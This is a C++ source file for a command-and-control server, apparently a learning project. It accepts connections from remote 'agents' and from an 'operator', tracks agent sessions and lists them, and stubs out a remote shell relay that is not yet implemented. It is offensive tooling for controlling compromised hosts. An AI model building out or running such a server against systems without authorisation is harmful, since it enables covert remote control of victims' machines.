#include <iostream>
#include <cstring> // for memcpy()
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <thread> // used to implement multithreading so that tcp server can handle multiple clients
#include <random>
#include <mutex> // will be used for locking session_registry cuz concurrent access might corrupt it
#include <print>
#include "server.hpp"
#include "packet.hpp"
#include "common.hpp"
// #include <openssl/ssl.h> // using openssl to encrypt the open socket communication
// #include <openssl/err.h>


std::mutex session_reg_mutex; // global locker variable created
struct AgentData{
    uint32_t agent_session_id;
    std::string agent_ip_addr;
    uint16_t agent_port;
};


void common::code_exit(){
    std::cout << "[*]Corrupted data exiting program...." << std::endl;
    exit(EXIT_FAILURE);
}


void common::socket_check(int soc_fd){ // socket failure error handling
    if(soc_fd < 0){
        std::perror("[*]connection failed");
        std::cout << std::endl;
        close(soc_fd);
    }
}


void common::send_failed(int client_fd){
    std::perror("[!] Data couldn't be sent from c2 server.");
    std::cout << "\n[!] connection error" << std::endl;
    close(client_fd);
}


void common::accept_failed(int client_fd){
    // client_fd < 0
    std::perror("[!]couldn't accept connection");
    std::cout << std::endl;
    close(client_fd);
}


void common::inet_ntop_failed(int client_fd){
    std::perror("[!]failed to convert agent ip address to human readable string");
    std::cout << std::endl;
    close(client_fd);
}


void common::getpeername_failed(int client_fd){
    std::perror("[!]failed to get agent ip address");
    std::cout << std::endl;
    close(client_fd);
}


void server::setsockopt_failed(int server_fd){ 
    // this function is executed when setsockopt fails
    std::perror("[!]setsockopt failed");
    close(server_fd);
    std::cout << std::endl;
    exit(EXIT_FAILURE);
}


void server::bind_failed(int server_fd){
    std::perror("[!]server bind failed");
    std::cout << std::endl;
    close(server_fd);
    exit(EXIT_FAILURE);
}



// handles operator data during sending
// if operator disconnects normally or due to connection errors this function is executed
void server::operator_data_recvHandling(int received_bytes, int client_fd){
    if(received_bytes == 0)
        std::cout << "[+] operator disconnected normally" << std::endl;
    else if(received_bytes < 0)
        std::cout << "[!] operator connection error" << std::endl;
    close(client_fd);
}


// acts as a python's send_all() approximate
// takes client_fd to send data to the particular agent
// takes const void *data because we don't know the address of the data we are storing so void * means the datatype of the address I am holding can be anything
// takes the size_t in length to store value upto 8 bytes or of varying range based on the length 
bool server::send_all(int client_fd, const void *data, size_t length){
    size_t total_bytes_sent = 0;
    while(total_bytes_sent < length){
        ssize_t bytes_sent = send(client_fd, static_cast<const char*>(data)+total_bytes_sent, length-total_bytes_sent, 0);
        if(bytes_sent <= 0){
            return false;
        }
        total_bytes_sent = total_bytes_sent + bytes_sent;
    }
    return true;
}


void server::get_active_agents(int client_fd){//function to get active agent session_ids and ip address and port
    std::vector<AgentData> snapshot; // store the session_registry values in a temp variable as a snapshot. Reason is session_registry is class variable so accessible by multiple threads leading to data corruption during simultaneous modifications by other threads but vector array is a local variable so accessible by this thread only. This solves our mutex issue
    {
        std::unique_lock<std::mutex> lock(session_reg_mutex);
        for(const auto &session : session_registry){ // using &session so that cpu doesn't  waste memory creating a copy of the unordered map data and cpu cycles and ALSO MAKE SURE WE DONT MODIFY THE session_registry while traversing
            snapshot.push_back({// pushes data at the end of the vector array (dynamic array)
                session.first,
                session.second.ip_address,
                session.second.port
            });
        }
    }
    uint32_t sessionCount = htonl(static_cast<uint32_t>(snapshot.size()));// htonl htons are stuff used to convert host bytes to network bytes before sending. snapshot.size() returns size_t so typcasting is necessary
    if(!send_all(client_fd, &sessionCount, sizeof(sessionCount))){
        common::send_failed(client_fd);
        return;
    }
    //take sessioninfo struct
    for(const auto &agent : snapshot){
        uint32_t sid = htonl(agent.agent_session_id);
        uint16_t ap = htons(agent.agent_port);
        if(!send_all(client_fd, &sid, sizeof(sid))){ // sending agent session_id
            common::send_failed(client_fd);
            return;
        }
        uint32_t aip_size = htonl(agent.agent_ip_addr.size());// sending agent ip address size 
        if(!send_all(client_fd, &aip_size, sizeof(aip_size))){
            common::send_failed(client_fd);
            return;
        }
        if(!send_all(client_fd, agent.agent_ip_addr.data(), agent.agent_ip_addr.size())){ //agent.agent_ip_addr is a string object but we need to send the actual data so .data() gives the starting address of the actual character
            common::send_failed(client_fd);
            return;
        }
        if(!send_all(client_fd, &ap, sizeof(ap))){
            common::send_failed(client_fd);
            return;
        }
    }
    close(client_fd);
}



int server::agentLookup(uint32_t session_id){
    std::cout << "[*] performing agent lookup using session registry table" << std::endl;
    {
        std::unique_lock<std::mutex> lock(session_reg_mutex);
        auto check = session_registry.find(session_id);// returns an iterator. an iterator is a pointer like object so auto is used for datatype compatibility
        if(check == session_registry.end()){ // .end() and .find() return an iterator which help us access the key value pair element and if it doesn't return an iterator then element not found
            std::cout << "[!]session_id not found" << std::endl;
            return -1;
        }
        std::cout << "[+]session_id found" << std::endl;
        int agent_fd = check->second.client_fd;
        return agent_fd;
    }
}



void server::handle_shell_session(int client_fd, int agent_fd, uint32_t session_id){
    // IMPLMENET CODE TO HANDLE SHELL SESSIONS
    // SENT SHELL DATA TO RESPECTIVE AGENTS
}



void server::command_dispatcher(const packet &received_packet, int client_fd){
    // Normal operator commands
    if(received_packet.message_type == MESSAGE_COMMAND){ // for basic commands
        if(received_packet.payload == "sessions"){ // get active agents in the network and send the data back to operator console
            get_active_agents(client_fd);
        }
        else{
            std::cout << "[!]unknown command received : "<< received_packet.payload << std::endl;
        }
    }
    // Start persistent shell session
    else if(received_packet.message_type == MESSAGE_SHELL_START){
        // based on the sid choose the corresponding client_fd from the session registry to send the command to the agent
        // find session_registry[received_packet.session_id]
        // get that agent's client_fd
        // send shell-start packet to that agent
        int agent_fd = agentLookup(received_packet.session_id);
        if(agent_fd < 0){ // when agent id could not be found in the session_registry then this block is executed
            std::cout << "[!]agent lookup failed" << std::endl;
            packet response{}; // initializing response structure to 0
            response.message_type = MESSAGE_ERROR;
            response.session_id = received_packet.session_id;
            response.payload = "invalid or inactive session";
            response.payload_length = response.payload.size();
            std::vector<uint8_t> serialized = serialization(response);
            if(!send_all(client_fd, serialized.data(), serialized.size())){
                common::send_failed(client_fd);
                return;
            }
        }
        std::cout << "[+] agent lookup succeeded" << std::endl;
        std::cout << "[+] agent fd : " << agent_fd << std::endl;
        uint32_t session_id = received_packet.session_id;
        handle_shell_session(client_fd, agent_fd, session_id);
    }
    else{
        std::cout << "[!]unsupported MESSAGE_TYPE received : " << received_packet.message_type << std::endl;
    }
}


std::vector<uint8_t> serialization(const packet &p1){ // CURRENTLY NOT USED !!! BUT WILL BE USED WHEN COMMAND SENT WILL BE IMPLEMENTED
    size_t total_size = 
        sizeof(uint32_t) + // message_type
        sizeof(uint32_t) + // session_id
        sizeof(uint32_t) + // payload_length
        p1.payload.size(); // payload
    
    std::vector<uint8_t> byte_array(total_size); // memory allocated
    uint8_t *byte_array_ptr = byte_array.data(); // in vector arrays .data() gives the address of the first element 
    if(byte_array_ptr == nullptr){ // if memory not allocated to vector array the if condition will be true
        common::code_exit();
    } 

    // converting the pacsession_idket_bytes (unsigned integers) to network bytes or big endian
    uint32_t message_type = htonl(p1.message_type);
    uint32_t session_id = htonl(p1.session_id);
    uint32_t payload_length = htonl(p1.payload.size());

    // copying this data to the vector array using memset
    // memcpy arguments => memcpy(arg1 = addr. of where to copy data, addr. of what to copy, sizeof(the data to copy))
    std::memcpy( // message_type copy
        byte_array_ptr, 
        &message_type,
        sizeof(message_type)
    );
    byte_array_ptr += sizeof(message_type); // increment the vector array pointer to copy the data in correct positions
    std::memcpy( // session_id copy
        byte_array_ptr,
        &session_id,
        sizeof(session_id)
    );
    byte_array_ptr += sizeof(session_id);
    std::memcpy(
        byte_array_ptr,
        &payload_length,
        sizeof(payload_length)
    );
    byte_array_ptr += sizeof(payload_length);
    std::memcpy(
        byte_array_ptr,
        p1.payload.data(),
        p1.payload.size()
    );
    return byte_array;
}


// DEMO FUNCTION FOR DEBUGGIN PURPORSES
void server::display_active_agents(){
    // display function here is kept inside mutex because if one agent is connected and another one disconnects
    // the display will cause problems so mutex is applied so that display is shown properly without any issue cuz iterating over the session_registry is still reading.
    std::unique_lock<std::mutex> lock(session_reg_mutex);
    if(session_registry.empty()){
        std::cout << "[!] no active agents present"<< std::endl;
        return;
    }
    std::println("{:<15}{:<20}{:<15}{:<10}", "SESSION_ID", "IP_ADDRESS", "CLIENT_FD", "PORT");
    std::println("{}", std::string(65, '_'));
    for(auto session_info : session_registry){
            std::println("{:<15}{:<20}{:<15}{:<10}",
            session_info.first,
            session_info.second.ip_address,
            session_info.second.client_fd,
            session_info.second.port
        );
    }
    std::println("{}", std::string(65, '_'));
}



int server::get_session_id(){
    session_id++;
    return session_id;
}





void server::detect_active_agents(int client_fd, int session_id){
    /*
                        SERVER
                      |
                listener thread
                      |
          +-----------+-----------+
          |           |           |
       accept()    accept()    accept()
          |           |           |
       client_fd   client_fd   client_fd
          |           |           |
       thread 1    thread 2    thread 3
          |           |           |
       session A   session B   session C

       using the threading we are able to implement this
    */
    char temp[1024];
    while(true){
        int received = recv(client_fd, temp, sizeof(temp), 0);
        if(received <= 0){ // received becomes 0 when agent disconnects and client_fd becomes invalid
            close(client_fd);
            {
                std::unique_lock<std::mutex> lock_session_reg(session_reg_mutex); // locks the below code and automatically performs lock_session.unlock() when goes out of function scope unless explicitly called. This lock makes sure when multiple agents don't access session_registry at the same time. only when one finishes the other can modify it. Without locking multiple modifications of the session_registry at the same time might result in program crash or segmentation faults. []
                session_registry.erase(session_id); // since session_registry is a pointer so we use arrow operator
            }
            if(received == 0)
                std::cout << "[!]agent id : " << session_id << " disconnected normally" << std::endl;
            else
                std::cout << "[!]agent id : " << session_id << "connection error" << std::endl;
            break;
        }
    }
    display_active_agents();
}


std::string deserialization_payload(const uint8_t* payload, size_t payload_size){
    return std::string(reinterpret_cast<const char *>(payload), payload_size);
}


packet deserialization_payload_header(const uint8_t payload_header[]){
/*
+-------------+-------------+-------------+----------------+
| Message Type|  Session ID | Payload Len |    Payload     |
|   4 bytes   |   4 bytes   |   4 bytes   | variable size  |
+-------------+-------------+-------------+----------------+
*/
    packet p1{}; // initializing the struct values to 0
    uint32_t message_type;
    uint32_t session_id;
    uint32_t payload_length;

    // reading message_type
    std::memcpy(
        &message_type,
        payload_header,
        sizeof(message_type)
    );
    // increment pointer to read correct data based on the value we need to store
    payload_header += sizeof(message_type);
    // reading session_id
    std::memcpy(
        &session_id,
        payload_header,
        sizeof(session_id)
    );
    payload_header += sizeof(session_id);
    // reading payload_length
    std::memcpy(
        &payload_length,
        payload_header,
        sizeof(payload_length)
    );
    // converting the data from network byte order to little endian byte order
    p1.message_type = ntohl(message_type);
    p1.session_id = ntohl(session_id);
    p1.payload_length = ntohl(payload_length);
    return p1;
}


bool server::recv_all(int client_fd, void *buffer, size_t length){
    size_t total_bytes_received = 0;
    while(total_bytes_received < length){
        ssize_t bytes_received = recv(client_fd, static_cast<char *>(buffer) + total_bytes_received, length - total_bytes_received, 0);
        if(bytes_received <= 0)
            return false;
        total_bytes_received = total_bytes_received + bytes_received;
    }
    return true;
}



void server::operator_listener(){
    std::println("[+] server listening on 0.0.0.0 port {} for OPERATOR",OPERATOR_PORT);
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    common::socket_check(server_fd);
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(OPERATOR_PORT);
    int opt = 1;
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0){
        setsockopt_failed(server_fd);
    }
    if(bind(server_fd, (struct sockaddr*) &server_address, sizeof(server_address)) < 0){
        bind_failed(server_fd);
    }
    listen(server_fd, 1);
    while(true){
        std::cout << "[*] waiting for connections (operator)" << std::endl;
        int client_fd = accept(server_fd, NULL, NULL);
        if(client_fd < 0){
            common::accept_failed(client_fd);
            continue;
        }
        std::cout << "[+] operator connected" << std::endl;
        // command length will be of 4 bytes so we will accept for bytes first

        // receive the packet strcuture
        //                  4 bytes          4 bytes          4 bytes
        //       +-------------+----------------+----------------+
        //       | Message Type|   Session ID    | Payload Length |
        //       +-------------+----------------+----------------+
        //       |                 Payload (N bytes)              |
        //       +------------------------------------------------+
        
        // receiving 12 byte header
        constexpr size_t HEADER_SIZE = 12;
        uint8_t payload_header[HEADER_SIZE];
        if(!recv_all(client_fd, payload_header,HEADER_SIZE)){
            std::cout << "[!]failed to receive payload header" << std::endl;
            close(client_fd);
            continue;
        }
        packet received_packet = deserialization_payload_header(payload_header); // converting raw payload_header bytes to human readable data
        std::cout << "[+]MESSAGE_TYPE : " << received_packet.message_type << std::endl;
        std::cout << "[+]SESSION_ID : " << received_packet.session_id << std::endl;
        std::cout << "[+]PAYLOAD_LENGTH : " << received_packet.payload_length << std::endl;
        //receiving payload
        if(received_packet.payload_length > 0){
            std::vector<uint8_t> payload(received_packet.payload_length);
            if(!recv_all(client_fd, payload.data(), received_packet.payload_length)){
                std::cout << "[!]failed to receive packet payload" << std::endl;
                close(client_fd);
                continue;
            }
            //deserializing payload
            // payload is still in bytes so we need to deserilize the payload to get human readable data
            received_packet.payload = deserialization_payload(payload.data(), payload.size());

            // Starting Dispatch
            std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
            if(received_packet.message_type == MESSAGE_COMMAND){
                command_dispatcher(received_packet, client_fd); // automatically passes the address of the packet structure without having to deal with complex pointers and dereferencing
            }
            else if(received_packet.message_type == MESSAGE_SHELL_START){
                command_dispatcher(received_packet, client_fd);
            }
            else{
                std::cout << "[!]unsupported MESSAGE_TYPE : " << received_packet.message_type << std::endl;
                close(client_fd);
            }
        }
    }
}



void server::agent_listener(){
    /*
    listener of tcp requires to perform the below functions
    1. socket creation
    2. struct sockaddr_in values configuration
    3. bind
    4. listen
    5. accept
    */
    std::println("[+] server listening on 0.0.0.0 port {} FOR AGENT", AGENT_PORT);
    int server_fd = socket(AF_INET, SOCK_STREAM, 0); // creating socket
    common::socket_check(server_fd);
    struct sockaddr_in server_address;
    struct sockaddr_in agent_address{}; // initialize all the agent_address strcuture to 0 otherwise it would have been garbage value
    socklen_t agent_address_len = sizeof(agent_address); // allocating agent address length size
    server_address.sin_family = AF_INET; // IPv4 address
    server_address.sin_addr.s_addr = INADDR_ANY; //  accept conncetions from all network interfaces 0.0.0.0
    server_address.sin_port = htons(AGENT_PORT); // listen to port 1234
    int opt = 1;
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0){
        // the server cant connect because the operating system holds the ports in a TIME_WAIT STATE
        // in this state the ports are in use so when the server tries to bind to this port the operating system refuses it
        // hence neither the server nor the agent can connect
        setsockopt_failed(server_fd);
    }
    if(bind(server_fd, (struct sockaddr*) &server_address, sizeof(server_address)) < 0){ // binding
        bind_failed(server_fd);
    }
    
    listen(server_fd, 1); // listening (max connection in queue = 2)
    while(true){ // kept in loop so that multiple clients can be handled
        // like if one agent connection is lost or connected the loop will start from while(true) again and try to accept new agent connection
        std::cout << "[*] waiting for connections (agent)" << std::endl;
        int client_fd = accept(server_fd, NULL, NULL); // accept connections from client
        if(client_fd < 0){
            common::accept_failed(client_fd);
            continue; // skips the rest of the below logic and retries accept()
        }
        std::cout << "[+] an agent connected" << std::endl;
        if(getpeername(client_fd, reinterpret_cast<struct sockaddr*>(&agent_address), &agent_address_len) < 0){// getpeername gets the ip address and port in network byte order (in raw bytes) thats why we use inet_htop to convert those raw bytes to human readable string
            common::getpeername_failed(client_fd);
            continue;
        }
        char agent_ip[INET_ADDRSTRLEN]; // allocating size for storing the human readable ip string (INET_ADDRSTRLEN is a macro for storing IPV4 address) 
        if(inet_ntop(AF_INET, &agent_address.sin_addr, agent_ip, sizeof(agent_ip)) == nullptr){
            common::inet_ntop_failed(client_fd);
            continue;
        }
        uint16_t agent_port = ntohs(agent_address.sin_port); // convert agent port which is in network byte order to host byte order
        std::println("[+]agent address : {}:{}",agent_ip, agent_port);
        int session_id = get_session_id();
        // the locking is required because multiple agents might insert data at the same time
        {
            std::unique_lock<std::mutex> lock(session_reg_mutex);
            session_registry[session_id] = {
                client_fd,
                std::string(agent_ip),
                agent_port 
            }; // mapping session_id to client_fd using unorderd_map 
            // after this lock will be unlocked automatically cuz out of scope
        }
        display_active_agents();
        std::thread client(&server::detect_active_agents, this, client_fd, session_id); // pass the address of original session_registry hash table
        // handle_multiple_clients() is a member function of the server class.
        // &server::handle_multiple_clients gives a pointer to that member function.
        // It identifies which member function the new thread should execute.
        // this keyword is used to tell the pointer which server object should it point to. In this case the current server object 
        client.detach();
    }
    std::cout << "[-]server exiting..." << std::endl;
    close(server_fd); // close server_socket created for listening
}
